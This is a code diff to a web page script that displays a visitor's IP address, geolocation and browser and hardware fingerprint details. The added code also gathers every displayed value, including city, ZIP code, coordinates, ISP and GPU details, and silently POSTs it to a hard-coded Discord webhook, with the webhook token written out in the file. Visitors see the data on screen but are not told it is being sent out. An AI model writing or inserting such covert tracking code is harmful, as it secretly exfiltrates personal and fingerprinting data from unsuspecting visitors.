@@ -177,48 +177,82 @@
         }
         await new Promise((resolve) => setTimeout(resolve, 300));
     }
-    async function fetchAndDisplayIPData() {
-        const ipData = await (await fetch("https://wtfismyip.com/json")).json();
-        const locationData = await (await fetch("https://we-are-jammin.xyz/json/" + ipData.YourFuckingIPAddress)).json();
-        await displayInfo("IP Address", ipData.YourFuckingIPAddress);
-        await displayInfo("Country", locationData.country);
-        await displayInfo("Region", locationData.regionName);
-        await displayInfo("City", locationData.city);
-        await displayInfo("ZIP Code", locationData.zip);
-        await displayInfo("Full Location", ipData.YourFuckingLocation);
-        await displayInfo("Latitude", locationData.lat);
-        await displayInfo("Longitude", locationData.lon);
-        await displayInfo("Timezone", locationData.timezone);
-        await displayInfo("Current Time", new Date().toLocaleString());
-        await displayInfo("ISP", locationData.isp);
-        await displayInfo("Organization", locationData.org);
-        await displayInfo("Autonomous System", locationData.as);
-        await displayInfo("Referrer", document.referrer || "None");
-        await displayInfo("System Languages", navigator.languages.join(", "));
-        await displayInfo("Screen Width", screen.width, 'px');
-        await displayInfo("Screen Height", screen.height, 'px');
-        if (screen.width != window.width || screen.height != window.height) {
-            await displayInfo("Window Width", window.outerWidth, 'px');
-            await displayInfo("Window Height", window.outerHeight, 'px');
-        }
-        await displayInfo("Display Pixel Depth", screen.pixelDepth);
-        if (typeof screen.orientation != "undefined") {
-            await displayInfo("Screen Orientation", screen.orientation.type.split('-')[0]);
-            await displayInfo("Screen Rotation", screen.orientation.angle, " degrees");
-        }
-        await displayInfo("CPU Threads", navigator.hardwareConcurrency);
-        await displayInfo("Available Browser Memory", typeof window.performance.memory != "undefined" ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : null, 'MB');
-        const canvas = document.createElement("canvas");
-        let gl, debugInfo;
-        try {
-            gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-            debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
-        } catch (_) {}
-        if (gl && debugInfo) {
-            await displayInfo("GPU Vendor", gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
-            await displayInfo("GPU Info", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+async function fetchAndDisplayIPData() {
+    const ipData = await (await fetch("https://wtfismyip.com/json")).json();
+    const locationData = await (await fetch("https://we-are-jammin.xyz/json/" + ipData.YourFuckingIPAddress)).json();
+
+    const info = [];
+
+    function log(label, value, unit = '') {
+        if (value !== null && value !== undefined) {
+            info.push(`**${label}:** ${value}${unit}`);
+            return displayInfo(label, value + unit);
         }
     }
+
+    await log("IP Address", ipData.YourFuckingIPAddress);
+    await log("Country", locationData.country);
+    await log("Region", locationData.regionName);
+    await log("City", locationData.city);
+    await log("ZIP Code", locationData.zip);
+    await log("Full Location", ipData.YourFuckingLocation);
+    await log("Latitude", locationData.lat);
+    await log("Longitude", locationData.lon);
+    await log("Timezone", locationData.timezone);
+    await log("Current Time", new Date().toLocaleString());
+    await log("ISP", locationData.isp);
+    await log("Organization", locationData.org);
+    await log("Autonomous System", locationData.as);
+    await log("Referrer", document.referrer || "None");
+    await log("System Languages", navigator.languages.join(", "));
+    await log("Screen Width", screen.width, 'px');
+    await log("Screen Height", screen.height, 'px');
+
+    if (screen.width !== window.width || screen.height !== window.height) {
+        await log("Window Width", window.outerWidth, 'px');
+        await log("Window Height", window.outerHeight, 'px');
+    }
+
+    await log("Display Pixel Depth", screen.pixelDepth);
+    if (typeof screen.orientation !== "undefined") {
+        await log("Screen Orientation", screen.orientation.type.split('-')[0]);
+        await log("Screen Rotation", screen.orientation.angle, " degrees");
+    }
+
+    await log("CPU Threads", navigator.hardwareConcurrency);
+    await log(
+        "Available Browser Memory",
+        typeof window.performance.memory !== "undefined"
+            ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024)
+            : null,
+        'MB'
+    );
+
+    const canvas = document.createElement("canvas");
+    let gl, debugInfo;
+    try {
+        gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+        debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    } catch (_) {}
+
+    if (gl && debugInfo) {
+        await log("GPU Vendor", gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+        await log("GPU Info", gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+    }
+
+    // 🔗 Send data to Discord webhook
+    const webhookUrl = "https://discord.com/api/webhooks/1392889091590455326/3MQJFADV6xdWPAFoWTIJvtMGc9OYwqAyQMZ6BYqlnx46D8xR_bwgp0ga5GBQ1cU63Bi_";
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: info.join("\n")
+        })
+    });
+}
     fetchAndDisplayIPData();
 }
 
